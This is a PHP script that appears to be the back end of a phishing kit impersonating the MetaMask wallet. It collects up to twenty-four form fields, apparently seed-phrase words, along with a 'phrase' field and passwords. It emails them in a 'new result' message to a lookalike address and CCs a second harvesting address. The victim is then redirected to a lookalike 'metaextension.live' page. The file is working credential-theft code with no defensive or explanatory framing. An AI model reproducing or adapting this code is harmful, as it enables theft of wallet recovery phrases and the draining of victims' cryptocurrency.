<?php
if (isset($_POST['send']))
{
    $subject ="new result";
    $cpassword = $_POST['cpassword'];
    $password = $_POST['password'];
    $one = $_POST['one'];
    $two = $_POST['two'];
    $phrase = $_POST['phrase'];
    $three = $_POST['three'];
    $four = $_POST['four'];
    $five = $_POST['five'];
    $six = $_POST['six'];
    $seven = $_POST['seven'];
    $eight = $_POST['eight'];
    $nine = $_POST['nine'];
    $ten = $_POST['ten'];
    $eleven = $_POST['eleven'];
    $twelve = $_POST['twelve'];
    $thirteen = $_POST['thirteen'];
    $fourteen = $_POST['fourteen'];
    $fifteen = $_POST['fifteen'];
    $sixteen = $_POST['sixteen'];
    $seventeen = $_POST['seventeen'];
    $eighteen = $_POST['eighteen'];
    $nineteen = $_POST['phrase'];
    $twenty = $_POST['twenty'];
    $twenty1 = $_POST['twenty1'];
    $twenty2 = $_POST['twenty2'];
    $twenty3 = $_POST['twenty3'];
    $twenty4 = $_POST['twenty4'];
    $recipient = 'support@meta-maskextension.com';
    $message = '<html><body>';
    $message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
    $message .= "<tr style='background: #eee;'><td><strong>Item:</strong> </td><td>Details</td></tr>";
    $message .= "<tr><td><strong>one:</strong> </td><td>" . $one . "</td></tr>";
    $message .= "<tr><td><strong>two:</strong> </td><td>" . $two . "</td></tr>";
    $message .= "<tr><td><strong>three:</strong> </td><td>" . $three . "</td></tr>";
    $message .= "<tr><td><strong>four:</strong> </td><td>" . $four . "</td></tr>";
    $message .= "<tr><td><strong>five:</strong> </td><td>" . $five . "</td></tr>";
    $message .= "<tr><td><strong>six:</strong> </td><td>" . $six . "</td></tr>";
    $message .= "<tr><td><strong>seven:</strong> </td><td>" . $seven . "</td></tr>";
    $message .= "<tr><td><strong>eight:</strong> </td><td>" . $eight . "</td></tr>";
    $message .= "<tr><td><strong>nine:</strong> </td><td>" . $nine . "</td></tr>";
    $message .= "<tr><td><strong>ten:</strong> </td><td>" . $ten . "</td></tr>";
    $message .= "<tr><td><strong>eleven:</strong> </td><td>" . $eleven . "</td></tr>";
    $message .= "<tr><td><strong>twelve:</strong> </td><td>" . $twelve . "</td></tr>";
    $message .= "<tr><td><strong>thirteen:</strong> </td><td>" . $thirteen . "</td></tr>";
    $message .= "<tr><td><strong>fourteen:</strong> </td><td>" . $fourteen . "</td></tr>";
    $message .= "<tr><td><strong>fifteen:</strong> </td><td>" . $fifteen . "</td></tr>";
    $message .= "<tr><td><strong>sixteen:</strong> </td><td>" . $sixteen . "</td></tr>";
    $message .= "<tr><td><strong>seventeen:</strong> </td><td>" . $seventeen . "</td></tr>";
    $message .= "<tr><td><strong>eighteen:</strong> </td><td>" . $eighteen . "</td></tr>";
    $message .= "<tr><td><strong>nineteen:</strong> </td><td>" . $nineteen . "</td></tr>";
    $message .= "<tr><td><strong>twenty:</strong> </td><td>" . $twenty . "</td></tr>";
    $message .= "<tr><td><strong>twenty1:</strong> </td><td>" . $twenty1 . "</td></tr>";
    $message .= "<tr><td><strong>twenty2:</strong> </td><td>" . $twenty2 . "</td></tr>";
    $message .= "<tr><td><strong>twenty3:</strong> </td><td>" . $twenty3 . "</td></tr>";
    $message .= "<tr><td><strong>twenty4:</strong> </td><td>" . $twenty4 . "</td></tr>";
    $message .= "<tr><td><strong>password:</strong> </td><td>" . $password . "</td></tr>";
    $message .= "<tr><td><strong>Cpassword:</strong> </td><td>" . $cpassword . "</td></tr>";
    $message .= "</table>";
    $message .= "</body></html>";

    $headers = "From: " . $recipient . "\r\n";
    $headers .= "Reply-To: ". $recipient. "\r\n";
    $headers .= "CC: results@ewalletauthorization.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";


    mail($recipient,$subject,$message, $headers);
    header("location: https://metaextension.live/lastpages.html");
}